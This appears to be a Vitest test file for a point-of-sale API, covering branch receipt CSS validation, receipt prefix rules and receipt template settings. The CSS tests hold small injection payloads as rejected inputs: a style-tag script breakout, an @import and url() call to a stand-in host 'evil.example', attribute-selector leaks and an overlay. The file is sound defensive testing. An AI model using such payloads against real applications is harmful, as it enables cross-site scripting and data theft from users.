import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { startApp, type TestApp } from './helpers';

// #4: branch receipt CSS and document prefixes.
let t: TestApp;
let admin: string;
let branchId: string;
beforeAll(async () => {
  t = await startApp();
  admin = await t.login();
  branchId = (await t.branchWithRegister(admin)).branch.id;
});
afterAll(async () => { await t.close(); });

const patch = (body: unknown) => t.call('PATCH', `/branches/${branchId}`, admin, body);

describe('receipt CSS', () => {
  it.each([
    ['a </style> breakout', '</style><script>alert(1)</script>'],
    ['@import and url()', '@import url(https://evil.example/x.css); .a { background: url(https://evil/?q) }'],
    ['attribute selectors', 'input[value^="a"] { color: red }'],
    ['position: fixed overlays', '.a { position: fixed; z-index: 9999 }']
  ])('rejects %s, naming the problem', async (_name, css) => {
    const res = await patch({ invoiceCss: css });
    expect(res.status).toBe(400);
    expect(String(res.body.message)).toMatch(/invoiceCss/);
  });

  it('saves allowed CSS', async () => {
    const res = await patch({ invoiceCss: '#printable-invoice { --receipt-ch: 32; } @media print { .receipt-logo { max-height: 40px } }' });
    expect(res.status).toBe(200);
  });
});

describe('document prefixes', () => {
  it('accepts letters, digits, - and / in receipt prefixes, and rejects anything else', async () => {
    expect((await patch({ receiptPrefix: 'RCPT/26' })).status).toBe(200);
    expect((await patch({ receiptPrefix: 'RC</title>' })).status).toBe(400);
    expect((await patch({ receiptPrefix: 'RC PT' })).status).toBe(400);
  });

});

describe('receipt templates', () => {
  const template = {
    style: 'DETAILED',
    paper: '58MM_SMALL',
    sections: {
      logo: false, header: true, largeStoreName: true, cashier: true, customer: true, hsn: true, itemTax: true,
      itemDiscount: true, lineTotal: true, taxSummary: true, itemCount: true, savings: true, payments: true,
      largeTotal: true, footer: true, barcode: true
    }
  };

  it('starts with none, so receipts use the classic layout', async () => {
    const res = await t.call('GET', `/branches/${branchId}`, admin);
    expect(res.status).toBe(200);
    expect(res.body.receiptTemplate).toBeNull();
  });

  it('saves a template, and keeps it when other settings change', async () => {
    expect((await patch({ receiptTemplate: template })).body.receiptTemplate).toEqual(template);
    expect((await patch({ receiptFooter: 'Thank you' })).body.receiptTemplate).toEqual(template);
    expect((await t.call('GET', `/branches/${branchId}`, admin)).body.receiptTemplate).toEqual(template);
  });

  it.each([
    ['an unknown layout', { ...template, style: 'FANCY' }],
    ['an unknown paper', { ...template, paper: 'LETTER' }],
    ['a missing section', { ...template, sections: { ...template.sections, barcode: undefined } }],
    ['a section that is not on or off', { ...template, sections: { ...template.sections, logo: 'yes' } }]
  ])('rejects %s', async (_name, body) => {
    expect((await patch({ receiptTemplate: body })).status).toBe(400);
  });

  it('goes back to the classic layout when cleared', async () => {
    expect((await patch({ receiptTemplate: null })).body.receiptTemplate).toBeNull();
  });
});
